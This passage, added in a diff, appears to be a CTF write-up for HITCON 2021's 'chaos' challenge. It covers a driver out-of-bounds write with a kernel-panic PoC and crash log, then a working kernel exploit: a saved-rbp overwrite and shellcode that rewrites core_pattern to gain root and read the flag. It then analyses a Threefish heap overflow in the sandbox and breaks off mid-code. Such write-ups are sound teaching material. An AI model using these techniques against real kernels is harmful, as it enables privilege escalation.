+    <span class="n">result</span> <span class="o">=</span> <span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">responses</span><span class="p">[</span><span class="n">resp_index</span><span class="p">].</span><span class="n">result</span><span class="p">;</span>
+    <span class="k">while</span> <span class="p">(</span><span class="n">time_left</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">100</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">time_left</span> <span class="o">=</span> <span class="n">schedule_timeout</span><span class="p">(</span><span class="n">time_left</span><span class="p">);</span>
+      <span class="n">prepare_to_wait_event</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">waitq</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wq_entry</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">);</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">responses</span><span class="p">[</span><span class="n">resp_index</span><span class="p">].</span><span class="n">result</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">timed_out</span> <span class="o">=</span> <span class="n">time_left</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">result</span> <span class="o">==</span> <span class="o">-</span><span class="mi">100</span><span class="p">;</span>
+    <span class="n">finish_wait</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">waitq</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wq_entry</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">chaos_dram_free</span><span class="p">(</span><span class="n">pool</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dram_request</span><span class="p">);</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">timed_out</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">110</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="k">if</span> <span class="p">((</span><span class="n">result</span> <span class="o">&amp;</span> <span class="mh">0x80000000</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">dev_err</span><span class="p">(</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">chaos_state</span><span class="o">-&gt;</span><span class="n">device</span><span class="p">,</span> <span class="s">"%s: fw returns an error: %d"</span><span class="p">,</span> <span class="s">"chaos_mailbox_request"</span><span class="p">,</span> <span class="n">result</span><span class="p">);</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">71</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">req</span><span class="o">-&gt;</span><span class="n">out_size</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This function can write out of bounds of the command queue (which has size 512) if the head index of the command queue is greater than 512. At first glance it looks like this can never happen because the driver always ANDs the value of the head index with 0x3FF when incrementing it and then again with 0xdff when accessing the queue, so the index should always be at most 511. However the driver is not the only component that can modify the head index. The firmware also has access to it and can set it to arbitrary values. The following PoC sets the index to a very big value and panics the kernel with a page fault:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/chaos"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">fd</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="n">assert</span><span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x4008CA00</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">mem</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">);</span>
+
+    <span class="k">struct</span> <span class="n">request</span> <span class="n">req</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">.</span><span class="n">field_0</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_8</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_c</span> <span class="o">=</span> <span class="mi">256</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_10</span> <span class="o">=</span> <span class="mi">32</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">field_14</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="p">.</span><span class="n">out_size</span> <span class="o">=</span> <span class="mi">256</span><span class="p">,</span>
+    <span class="p">};</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xC01CCA00</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">);</span>
+    <span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xC01CCA00</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">req</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<pre><code class="language-x86asm">BITS 64
+DEFAULT rel
+
+csr_start equ 0x10000
+
+; overwrite the command queue's head pointer.
+mov rax, 0x4141414141414141
+mov [csr_start + 0x50], rax
+
+; exit
+mov edi, 0
+mov eax, 60
+syscall
+</code></pre>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[    2.964179] general protection fault, probably for non-canonical address 0x505019505070504d: 0000 [#1] SMP NOPTI
+[    2.965393] CPU: 0 PID: 78 Comm: run Tainted: G           O      5.15.6 #5
+[    2.966232] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.14.0-0-g155821a1990b-prebuilt.qemu.org 04/01/2014
+[    2.967558] RIP: 0010:chaos_mailbox_request+0x159/0x2e0 [chaos]
+[    2.968249] Code: 48 89 d0 48 83 c2 01 80 e4 fd c7 44 24 2c 1c 00 00 00 81 e2 ff 03 00 00 4c 8d 04 40 4a 8d 04 80 4c 8b 44 24 23 48 03 44 24 10 &lt;4c&gt; 89 00 44 8b 44 24 2b 44 89 40 08 44 0f b6 44 24 2f 44 88 40 0c
+[    2.970407] RSP: 0018:ffffc900001b7df8 EFLAGS: 00010207
+[    2.971016] RAX: 505019505070504d RBX: ffffc900001b7ec4 RCX: 0000000000000002
+[    2.971841] RDX: 0000000000000142 RSI: 0000000000000100 RDI: ffff888003f39058
+[    2.972662] RBP: ffff888003eff2e8 R08: 0040000100000002 R09: ffffc90000204000
+[    2.973483] R10: 000000000000003c R11: 00000000000000ca R12: 0000000000000000
+[    2.974303] R13: 4141414141414141 R14: ffff888003f39028 R15: ffff888003f421a8
+[    2.975126] FS:  0000000000408718(0000) GS:ffff88801f200000(0000) knlGS:0000000000000000
+[    2.976047] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    2.976704] CR2: 000000000042eb90 CR3: 0000000003f68000 CR4: 00000000000006f0
+[    2.977526] Call Trace:
+[    2.977820]  &lt;TASK&gt;
+[    2.978071]  ? selinux_file_ioctl+0x16f/0x210
+[    2.978582]  chaos_fs_ioctl+0x11c/0x230 [chaos]
+[    2.979108]  __x64_sys_ioctl+0x7e/0xb0
+[    2.979560]  do_syscall_64+0x3b/0x90
+[    2.979981]  entry_SYSCALL_64_after_hwframe+0x44/0xae
+</code></pre></div></div>
+
+<p>The interrupt handler, which reads the result queue, has the same bug but this time it reads out of bounds instead of writing:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">chaos_mailbox_handle_irq</span><span class="p">(</span><span class="k">struct</span> <span class="n">chaos_mailbox</span> <span class="o">*</span><span class="n">mailbox</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">struct</span> <span class="n">chaos_state</span> <span class="o">*</span><span class="n">chaos_state</span> <span class="o">=</span> <span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">chaos_state</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">chaos_resp_desc</span> <span class="o">*</span><span class="n">result_queue</span> <span class="o">=</span> <span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">output_queue</span><span class="p">.</span><span class="n">virt_addr</span><span class="p">;</span>
+  <span class="n">raw_spin_lock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">spinlock</span><span class="p">);</span>
+  <span class="kt">uint64_t</span> <span class="n">i</span> <span class="o">=</span> <span class="n">chaos_state</span><span class="o">-&gt;</span><span class="n">csrs</span><span class="p">.</span><span class="n">virt_addr</span><span class="o">-&gt;</span><span class="n">result_head</span><span class="p">;</span>
+  <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">!=</span> <span class="n">chaos_state</span><span class="o">-&gt;</span><span class="n">csrs</span><span class="p">.</span><span class="n">virt_addr</span><span class="o">-&gt;</span><span class="n">result_tail</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">desc</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">result_queue</span><span class="p">[</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffffdff</span><span class="p">];</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3FF</span><span class="p">;</span>
+    <span class="n">id</span> <span class="o">=</span> <span class="n">desc</span><span class="o">-&gt;</span><span class="n">req_id</span><span class="p">;</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">desc</span><span class="o">-&gt;</span><span class="n">result</span><span class="p">;</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">responses</span><span class="p">[</span><span class="n">desc</span><span class="o">-&gt;</span><span class="n">req_id</span> <span class="o">&amp;</span> <span class="mh">0x1FF</span><span class="p">];</span>
+    <span class="n">resp</span><span class="o">-&gt;</span><span class="n">req_id</span> <span class="o">=</span> <span class="n">id</span><span class="p">;</span>
+    <span class="n">resp</span><span class="o">-&gt;</span><span class="n">result</span> <span class="o">=</span> <span class="n">result</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">chaos_state</span><span class="o">-&gt;</span><span class="n">csrs</span><span class="p">.</span><span class="n">virt_addr</span><span class="o">-&gt;</span><span class="n">result_head</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+  <span class="n">spin_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">spinlock</span><span class="p">);</span>
+  <span class="n">_wake_up</span><span class="p">(</span><span class="o">&amp;</span><span class="n">mailbox</span><span class="o">-&gt;</span><span class="n">waitq</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This gives us an out of bounds read/write, which should be enough to completely own the kernel.</p>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>The bug we found gives us an out of bounds write relative to the address of the command queue. The index is 64-bit so we can write to almost any address (bit 9 of the index is cleared before accessing the queue). We can write a 13-byte command descriptor containing predictable data.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">chaos_input_rb_desc</span> <span class="p">{</span>
+  <span class="c1">// Set by the driver, but predictable.</span>
+  <span class="kt">uint16_t</span> <span class="n">req_id</span><span class="p">;</span>
+  <span class="c1">// Always 0</span>
+  <span class="kt">uint16_t</span> <span class="n">gap</span><span class="p">;</span>
+  <span class="c1">// Always 1</span>
+  <span class="kt">uint8_t</span> <span class="n">unk</span><span class="p">;</span>
+  <span class="c1">// Set by the driver, value between 0 and 0x100000</span>
+  <span class="kt">uint32_t</span> <span class="n">buffer_offset</span><span class="p">;</span>
+  <span class="c1">// Always 28</span>
+  <span class="kt">uint32_t</span> <span class="n">buffer_size</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<p>To get an idea of where our buffer could be and what could be around it we had a look at the kernel’s documentation, which includes a <a href="https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt">map of the kernel’s address space on x86</a>. The command queue is located in the CHAOS device memory, and the driver uses <code class="language-plaintext highlighter-rouge">devm_ioremap</code> to map that region into virtual memory. <code class="language-plaintext highlighter-rouge">ioremap</code> allocates virtual memory from the vmalloc region (<code class="language-plaintext highlighter-rouge">0xffffc90000000000-0xffffe90000000000</code> on x86_64), so the ring buffer will be somewhere in that region. After looking around in GDB for a while we noticed that the kernel stack of our process is also located there. This makes sense, because the kernel’s stacks are also <a href="https://elixir.bootlin.com/linux/latest/source/kernel/fork.c#L246">allocated</a> from the vmalloc region by default. However even more importantly it looked like the kernel’s stack is at a constant, or at least predictable, offset from the command queue. This means that we should be able to reliably overwrite a specific value saved on the stack with contorlled data without needing any leaks.</p>
+
+<p>There are many ways to exploit this. The target VM has no SMEP and no SMAP, which means that we can redirect any kernel data and code pointers to memory controlled by us in userspace. With some trial and error to figure out which offsets would overwrite what value, we found that offset <code class="language-plaintext highlighter-rouge">0x13b13b13b13ad88c</code> reliably overwrites a saved <code class="language-plaintext highlighter-rouge">rbp</code> on the kernel’s stack. This value depends on what other <code class="language-plaintext highlighter-rouge">vmalloc</code> allocations the kernel did before running the exploit so it’s somewhat specific to the setup we used but it works reliably. The overwrite clears the top 16 bits of the saved <code class="language-plaintext highlighter-rouge">rbp</code>, which redirects it to a userspace address. We can mmap this address and gain control of the kernel’s stack as soon as the kernel executes a <code class="language-plaintext highlighter-rouge">leave</code> instruction. We then only have to fill the fake stack with a pointer to some shellcode.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">alloc_rbp</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">offset</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">rbp</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mh">0x00000003001cf000</span> <span class="o">+</span> <span class="mh">0x040000000</span><span class="o">*</span><span class="n">offset</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_FIXED</span> <span class="o">|</span> <span class="n">MAP_ANON</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">assert</span><span class="p">(</span><span class="n">rbp</span> <span class="o">!=</span> <span class="n">MAP_FAILED</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">rbp</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pwn_kernel</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The shellcode is pretty simple: it reads the IA32_LSTAR, which contains the address of the system call handler, to recover address of the kernel and then overwrites <code class="language-plaintext highlighter-rouge">core_pattern</code> with the path to our exploit. It then executes <code class="language-plaintext highlighter-rouge">swapgs; sysret</code> to return to userspace. The exploit returns to userspace at an invalid address and crashes, which runs the core dump handler, which is now our exploit itself. The core dump handler runs as root, so our exploit can read the flag and print it to the serial console.</p>
+
+<pre><code class="language-x86asm">BITS 64
+DEFAULT rel
+global pwn_kernel
+
+kernel_base equ 0xffffffff81000000
+syscall_handler_off equ 0xffffffff81c00000 - kernel_base
+core_pattern_off equ 0xffffffff82564060 - kernel_base
+
+pwn_kernel:
+    ; read IA32_LSTAR, which contains the address of the syscall handler
+    mov ecx, 0xc0000082
+    rdmsr
+    shl rdx, 32
+    or rax, rdx
+
+    mov rbx, syscall_handler_off
+    sub rax, rbx
+    ; rbx = kernel base
+    mov rbx, rax
+
+    mov rax, core_pattern_off
+    mov rcx, rbx
+    ; rcx = core_pattern
+    add rcx, rax
+
+    ; overwrite core_pattern
+    mov rbx, '|/home/c'
+    mov [rcx], rbx
+    mov rbx, 'haos/run'
+    mov [rcx + 8], rbx
+    xor ebx, ebx
+    mov [rcx + 16], rbx
+
+    ; return to userspace and crash
+    xor ecx, ecx
+    mov r11, 0x002
+    swapgs
+    sysret
+</code></pre>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">system</span><span class="p">(</span><span class="s">"cat /flag &gt; /dev/ttyS0"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="cm">/* ... */</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">hitcon{so this is how we attack kernel from a device}</code></p>
+
+<h2 id="part-3-sandbox">Part 3: Sandbox</h2>
+
+<h3 id="analysis">Analysis</h3>
+
+<p>The flag for part 3 is also a file outside the sandbox. However unlike in part 1, there is no system call that copies the flag into the CHAOS memory for us. The sandbox only opens the file that contains the third flag, but then doesn’t do anything with it. Clearly this means that we must somehow pwn the sandbox and read the contents of the file somewhere into shared memory where our firmware can access them. As we mentioned before, the sandbox has some system calls that let the chip perform some cryptographic operations on data supplied by the firmware. More specifically, the sandbox implements the following:</p>
+
+<ul>
+  <li>MD5</li>
+  <li>SHA256</li>
+  <li>AES encrypt/decrypt</li>
+  <li>RC4 encrypt/decrypt</li>
+  <li>Blowfish encrypt/decrypt</li>
+  <li>Twofish encrypt/decrypt</li>
+  <li>Threefish encrypt/decrypt</li>
+</ul>
+
+<p>Except for MD5 and SHA256, all of these operations also need a key. The client can use the <code class="language-plaintext highlighter-rouge">add_key</code> and <code class="language-plaintext highlighter-rouge">delete_key</code> to add and remove keys from the sandbox’s key storage. The key storage is implemented as a <code class="language-plaintext highlighter-rouge">std::map&lt;uint32_t, struct buffer&gt;</code>, which maps a key ID to the key data and is implemented using a search tree.</p>
+
+<p>Now, except for MD5, SHA256 and RC4 all of the algorithms implemented in the sandbox are block ciphers, which take a fixed-size block of input and produce a block of output having the same size as the input. The block size is usually a fixed value chosen by the designers of the algorithm.</p>
+
+<p>Consider now the function that implements Threefish encryption, which has a block size of 32 bytes:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">threefish_encrypt</span><span class="p">(</span><span class="k">struct</span> <span class="n">buffer</span> <span class="o">*</span><span class="n">output</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buffer</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="k">struct</span> <span class="n">buffer</span> <span class="o">*</span><span class="n">input</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">_exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kt">size_t</span> <span class="n">size</span> <span class="o">=</span> <span class="n">input</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">((</span><span class="n">size</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x20</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">_exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">output</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="n">output</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="n">size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0xFFFFF</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">_exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">new</span> <span class="kt">uint8_t</span><span class="p">[</span><span class="n">size</span><span class="p">];</span>
+  <span class="n">output</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">out</span><span class="p">;</span>
+  <span class="n">do_threefish_encrypt</span><span class="p">(</span><span class="n">key</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">,</span> <span class="n">input</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">out</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>While the function checks that the size of the input is not bigger than the block size, it doesn’t check that it’s exactly equal to the block size. On top of that it allocates an output buffer whose size is the same as the size of the input, rather than a fixed-size buffer. This means that the encryption can write out of bounds if we pass it an input buffer that is smaller than 32 bytes. All block ciphers have this bug but it’s only exploitable with threefish because it’s the only cipher with a block size greater than 24 bytes, which is the smallest usable buffer returned by glibc’s malloc. This bug gives us a 8-byte out of bounds read and an 8 byte out of bounds write on a heap chunk of size 24 (the input data is also assumed to be 32 bytes).</p>
+
+<p>Ok, so we have a heap overflow and overread, how can we exploit this? Fortunately, if we do overflow, we do so directly into the size field of the next chunk. Therefore, our goal was to overflow the size field of a small chunk with a large size. However, there were a bunch of complications before achieving this.</p>
+
+<p>The biggest issue we were facing, is the fact that both encryption and decryption do not (directly) allow for a controlled overflow. Encryption, of course, leads to mostly gibberish in the overflown area. Furthermore, since our input also has to be smaller than 32 bytes, part of the encryption input is from the next heap chunk! This also makes it nontrivial to get a controlled overflow with decryption, since we do not control part of the encrypted input, that will be decrypted.</p>
+
+<p>The intended solution here, was to use crypto to your advantage and figure out a way, such that known but not controlled input also decrypts to something you wanted. However, we found a much easier approach, that did not involve pinging our crypto people on discord ;).</p>
+
+<p>We first present the heap setup we want to have, then how we actually achieved that.
+The basic setup we need, is the following, where the three separate parts of the heap, can be anywhere.</p>
+
+<p><img src="/HITCON-2021/pwn/chaos2.jpg" alt="" /></p>
+
+<p>The sizes shown are the actual sizes used by malloc (so rounded up to the nearest 0x10).
+Furthermore, except the sizes for the input / output chunks, the other sizes are not particularly specific.
+However, we do need to have <code class="language-plaintext highlighter-rouge">sizeof(L) &gt;&gt; sizeof(S)</code>. The goal is to now roughly have the following happen <sup id="fnref:1" role="doc-noteref"><a href="#fn:1" class="footnote" rel="footnote">1</a></sup>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span><span class="o">*</span> <span class="n">I_E</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+<span class="kt">void</span><span class="o">*</span> <span class="n">O_E</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+<span class="kt">void</span><span class="o">*</span> <span class="n">I_D</span> <span class="o">=</span> <span class="n">O_E</span><span class="p">;</span>
+<span class="kt">void</span><span class="o">*</span> <span class="n">O_D</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
+<span class="n">threefish_encrypt</span><span class="p">(</span><span class="n">I_E</span><span class="p">,</span> <span class="n">O_E</span><span class="p">);</span>
+<span class="n">threefish_decrypt</span><span class="p">(</span><span class="n">I_D</span><span class="p">,</span> <span class="n">O_D</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>In particular, the purpose of the different chunks are as follows:</p>
+
+<ul>
+  <li>$I_E$: input to the threefish encryption using overflow. The encryption will read the size of the next chunk $L$ oob, as the last 8 bytes of input.</li>
+  <li>$O_E$ / $I_D$: output of the threefish encryption, but then also input of the threefish decryption. During encryption, the size of the next chunk will be overwritten. During decryption, the size of the next chunk will be read oob, as the last 8 bytes of input.</li>
+  <li>$O_D$: output of the threefish decryption. The size of the next chunk will be overwritten, with the last 8 bytes of output.</li>
+  <li>$L$: A large chunk. We will overwrite the size of $S$, with this size.</li>
+  <li>$D$: A chunk that is never freed. Since we corrupt the size with the encryption, we do not want to free it, otherwise malloc is unhappy.</li>
+  <li>$S$: A small chunk. Target for our overwrite.</li>
+</ul>
+
+<p>This works out well, since we do not change the input of our encryption before decryption, the output of the decryption must be the same as our initial input. Since the initial input’s last 8 bytes was a large size, the small size of $S$ will be overwritten with this large size. If we now allocate $S$, free it again, it will be in the tcache of a much larger size than it should be. We can then allocate a chunk of size $0x150$ and get back $S$. Then we have a fully controlled overflow of a much larger area of the heap.</p>
+
+<p>This whole procedure is shown in the image below:</p>
+
+<p><img src="/HITCON-2021/pwn/chaos3.jpg" alt="" /></p>
+
+<p>So our goal is now clear, we need the specific heap layout and allocations mentioned before.
+But how do we get there?</p>
+
+<p>There are two major pain points in trying to achieve this.
+Firstly, the heap is not in a clean state when we start our exploit, since the firmware loading also uses the heap already.
+Secondly, there are no good malloc and free primitives. To get the heap into a certain state, ideally we would be able to malloc and free arbitrary sizes. The best primitive we found, was the addition and removal of keys. While it allows us to malloc an arbitrarily sized chunk and free it later, it also has a major drawback. The malloc of the size we control, happens in between a <code class="language-plaintext highlighter-rouge">malloc(0x10)</code> and a <code class="language-plaintext highlighter-rouge">malloc(0x30)</code>. The former to act as a kind of wrapper around our malloc’d buffer, the latter as the node in a red-black-tree. This is the case, because the different keys are saved inside an <code class="language-plaintext highlighter-rouge">std::map</code>.</p>
+
+<p>Astute readers will have noticed, that the wrapper struct is actually of the same size as our target buffers to overflow.
+In fact, both of these pain points can help us out in certain ways.</p>
+
+<p>We will now show the heap feng shui of our exploit, then explain why the different allocations work and how they help us towards our goal. But first, we explain the <code class="language-plaintext highlighter-rouge">do_malloc</code> and <code class="language-plaintext highlighter-rouge">do_free</code> functions. These correspond to adding and removing a key respectively. As such, a simplified view of these is basically:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">size_t</span> <span class="nf">do_malloc</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">key_buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+    <span class="kt">void</span><span class="o">*</span> <span class="n">tree_node</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
+    <span class="kt">size_t</span> <span class="n">key_id</span> <span class="o">=</span> <span class="n">curr_id</span><span class="p">;</span>
+    <span class="n">curr_id</span><span class="o">++</span><span class="p">;</span>
+    <span class="n">keys</span><span class="p">[</span><span class="n">key_id</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">key_buf</span><span class="p">,</span> <span class="n">tree_node</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">do_free</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">key_idx</span><span class="p">)</span> <span class="p">{</span>
